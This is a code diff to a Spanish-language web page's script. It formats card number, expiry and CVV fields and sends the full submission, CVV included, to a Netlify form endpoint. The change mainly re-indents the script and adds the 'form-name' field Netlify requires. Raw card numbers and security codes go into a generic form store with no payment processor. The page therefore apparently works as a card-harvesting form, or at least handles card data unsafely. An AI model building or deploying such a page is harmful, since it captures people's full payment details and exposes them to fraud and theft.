@@ -103,81 +103,87 @@
   </form>
 
   <script>
-  const cardInput = document.getElementById('numero');
-  const expiryInput = document.getElementById('vencimiento');
-  const cvvInput = document.getElementById('cvv');
-  const successMessage = document.getElementById('success-message');
+    const cardInput = document.getElementById('numero');
+    const expiryInput = document.getElementById('vencimiento');
+    const cvvInput = document.getElementById('cvv');
+    const successMessage = document.getElementById('success-message');
 
-  function detectCardType(number) {
-    if (/^3[47]/.test(number)) return 'amex';
-    return 'default';
-  }
-
-  function formatCardNumber(value) {
-    const digits = value.replace(/\D/g,'');
-    const type = detectCardType(digits);
-    let parts = [];
-
-    if (type === 'amex') {
-      parts.push(digits.slice(0,4));
-      if (digits.length > 4) parts.push(digits.slice(4,10));
-      if (digits.length > 10) parts.push(digits.slice(10,15));
-    } else {
-      for (let i = 0; i < digits.length; i += 4) {
-        parts.push(digits.slice(i, i + 4));
-      }
+    function detectCardType(number) {
+      if (/^3[47]/.test(number)) return 'amex';
+      return 'default';
     }
-    return parts.join(' ').slice(0, 19);
-  }
 
-  cardInput.addEventListener('input', (e) => {
-    const formatted = formatCardNumber(e.target.value);
-    e.target.value = formatted;
-    const digits = formatted.replace(/\D/g,'');
-    const type = detectCardType(digits);
-    cvvInput.maxLength = (type === 'amex') ? 4 : 3;
-  });
+    function formatCardNumber(value) {
+      const digits = value.replace(/\D/g,'');
+      const type = detectCardType(digits);
+      let parts = [];
 
-  expiryInput.addEventListener('input', (e) => {
-    let val = e.target.value.replace(/\D/g,'').slice(0,4);
-    if (val.length >= 3) val = val.slice(0,2) + ' / ' + val.slice(2);
-    e.target.value = val;
-  });
+      if (type === 'amex') {
+        parts.push(digits.slice(0,4));
+        if (digits.length > 4) parts.push(digits.slice(4,10));
+        if (digits.length > 10) parts.push(digits.slice(10,15));
+      } else {
+        for (let i = 0; i < digits.length; i += 4) {
+          parts.push(digits.slice(i, i + 4));
+        }
+      }
+      return parts.join(' ').slice(0, 19);
+    }
 
-  function handleSubmit(event) {
-    event.preventDefault();
-    const form = event.target;
-
-    // Validaciones
-    const digits = cardInput.value.replace(/\D/g,'');
-    if (digits.length < 12) return alert('Introduce un número de tarjeta válido.');
-
-    const exp = expiryInput.value.replace(/\s|\/+/g,'');
-    if (exp.length !== 4) return alert('Introduce vencimiento en formato MM / AA');
-
-    const mm = parseInt(exp.slice(0,2),10);
-    if (!(mm >= 1 && mm <= 12)) return alert('Mes de vencimiento inválido');
-
-    // PREPARAR DATOS - FORMATO NETLIFY CORRECTO
-    const data = new FormData(form);
-
-    fetch("/", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: new URLSearchParams(data).toString()
-    })
-    .then(() => {
-      form.reset();
-      successMessage.classList.add('show');
-      window.scrollTo({ top: 0, behavior: 'smooth' });
-    })
-    .catch(() => {
-      alert("Hubo un error al enviar el formulario.");
+    cardInput.addEventListener('input', (e) => {
+      const formatted = formatCardNumber(e.target.value);
+      e.target.value = formatted;
+      const digits = formatted.replace(/\D/g,'');
+      const type = detectCardType(digits);
+      cvvInput.maxLength = (type === 'amex') ? 4 : 3;
     });
-  }
-</script>
+
+    expiryInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g,'').slice(0,4);
+      if (val.length >= 3) val = val.slice(0,2) + ' / ' + val.slice(2);
+      e.target.value = val;
+    });
+
+    function handleSubmit(event) {
+      event.preventDefault();
+      const form = event.target;
+
+      // Validaciones
+      const digits = cardInput.value.replace(/\D/g,'');
+      if (digits.length < 12) return alert('Introduce un número de tarjeta válido.');
+
+      const exp = expiryInput.value.replace(/\s|\/+/g,'');
+      if (exp.length !== 4) return alert('Introduce vencimiento en formato MM / AA');
+
+      const mm = parseInt(exp.slice(0,2),10);
+      if (!(mm >= 1 && mm <= 12)) return alert('Mes de vencimiento inválido');
+
+      // Preparar envío compatible con Netlify
+      const data = new FormData(form);
+      const encoded = new URLSearchParams();
+
+      encoded.append("form-name", form.getAttribute("name"));
+
+      for (const [key, value] of data) {
+        encoded.append(key, value);
+      }
+
+      fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: encoded.toString()
+      })
+      .then(() => {
+        form.reset();
+        successMessage.classList.add('show');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      })
+      .catch(() => {
+        alert("Hubo un error al enviar el formulario.");
+      });
+    }
+  </script>
+
 
 </body>
 </html>
